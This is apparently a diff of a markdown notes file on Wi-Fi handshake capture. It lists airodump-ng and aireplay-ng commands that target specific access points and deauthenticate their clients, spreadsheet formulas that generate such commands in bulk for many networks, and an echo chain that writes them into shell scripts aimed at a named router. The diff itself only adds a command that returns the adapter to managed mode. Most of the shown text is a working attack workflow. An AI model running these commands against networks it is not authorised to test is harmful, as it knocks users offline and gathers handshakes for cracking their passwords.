@@ -42,7 +42,7 @@ airodump-ng --bssid 11:22:33:44:55:66 --channel 2 wlan0 -w output
 aireplay-ng --deauth 10 -a 11:22:33:44:55:66 wlan0 	
 wpaclean out.cap in.cap
 ```
-#### Use in xls:
+### Use in xls:
 
 #### replace in text mode out-01.csv  [' ' > '' and ','>';']
 #### Insert formula in Cell:
@@ -56,6 +56,11 @@ x	dump	death	clean	sh
 =ВПР(A3;F:F;1;ЛОЖЬ) 	=СЦЕПИТЬ("airodump-ng --bssid ";A3;" ";" --channel ";D3;" ";" wlan0 -w ";N3) 	=СЦЕПИТЬ("aireplay-ng --deauth 10 -a ";A3;" ";"wlan0") 	=СЦЕПИТЬ("watch -n 1 wpaclean clean_";N3;".cap ";N3;"-01.cap")	echo airodump-ng --bssid A8:63:7D:1A:67:E3  --channel 1  wlan0 -w MTSRouter_67E1 > 1.sh && echo aireplay-ng --deauth 10 -a A8:63:7D:1A:67:E3 wlan0 > 2.sh && echo watch -n 1 wpaclean clean_MTSRouter_67E1.cap MTSRouter_67E1-01.cap > 3.sh && chmod +x *.sh
 
 ```
+### Reset wifi adapter to normal managed
+```bash
+sudo ip link set wlan0 down && sudo iw dev wlan0 set type managed && sudo ip link set wlan0 up && systemctl start NetworkManager
+```
+
 
 ### Wi-Fi Dumping (wifi_dump.sh)
 
